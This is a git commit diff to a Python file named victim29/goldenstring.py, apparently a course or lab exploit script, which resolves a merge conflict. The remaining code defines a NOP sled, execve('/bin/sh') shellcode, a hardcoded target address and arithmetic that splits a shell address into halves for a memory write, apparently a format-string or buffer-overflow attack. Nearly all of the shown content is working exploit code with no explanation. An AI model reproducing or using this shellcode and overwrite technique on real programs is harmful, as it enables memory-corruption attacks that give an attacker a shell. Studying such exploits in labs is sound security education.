98e9269b148019d483e5cd4435a54c3bceb8f73c
Stephen Dean <stephendean2016@gmail.com>
2022-10-23 15:29:33 -0500

    fdsf

--- victim29/goldenstring.py
+++ victim29/goldenstring.py
@@ -3,16 +3,12 @@ import os
 NOPSLED = b'\x90' * 0x300
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 
-<<<<<<< HEAD
-SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
-=======
 ADDRESSTOWRITE = b'BFFFE57C'
 i = 1
 ADDRESSOFSHELL = b'\xBF\xFF\xEF\xC8'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
->>>>>>> 8711a21439538d7a9a543b4d8b0baa0049f74310
 
 ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[2:], 'little') - 2540
 ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[0:2], 'little') - ADDRESSOFSHELL1 - 2540
